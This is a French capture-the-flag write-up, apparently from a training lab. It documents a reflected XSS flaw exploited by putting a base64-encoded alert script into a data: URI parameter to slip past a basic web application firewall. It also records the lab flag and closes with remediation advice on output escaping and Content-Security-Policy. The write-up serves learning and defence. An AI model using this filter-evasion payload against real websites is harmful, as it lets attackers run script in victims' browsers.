FAILLE XSS-Reflected (Media)

Il convient d’encoder <script>alert('XSS')</script> en base64 ce qui donne PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
Aller sur le site https://www.base64encode.org/fr/ pour encoder
Puis le mettre directement dans l’URL :
http://192.168.10.22/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=

L'utilisation du protocole data: permet d'injecter directement le contenu malveillant dans le DOM de la page sans charger de fichier externe. 
L'encodage en Base64 permet de masquer les balises <script> pour éviter une détection par un pare-feu applicatif (WAF) rudimentaire.

FLAG => 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d

======================================================================================================================================================
REMEDIATION :

Protection contre les failles XSS (Reflected & Stored)
La vulnérabilité provient d'une confiance aveugle en l'entrée utilisateur. Pour la corriger, nous appliquons une stratégie de défense en profondeur :
-	Nettoyage des données (Output Escaping) : La fonction htmlspecialchars() est la méthode la plus efficace en PHP. Elle transforme les caractères spéciaux (comme < et >) en entités HTML inoffensives. Ainsi, le navigateur affiche le script sous forme de texte brut au lieu de l'exécuter.

Exemple : Le serveur transforme <script> en &lt;script&gt;
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

-	Mise en place d'une Politique de Sécurité de Contenu (CSP) : L'ajout d'un header HTTP Content-Security-Policy permet de restreindre les sources de scripts autorisées. En définissant default-src 'self', on interdit l'exécution de scripts provenant de domaines externes ou de sources data: (ce qui aurait bloqué ton exploitation Base64).
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
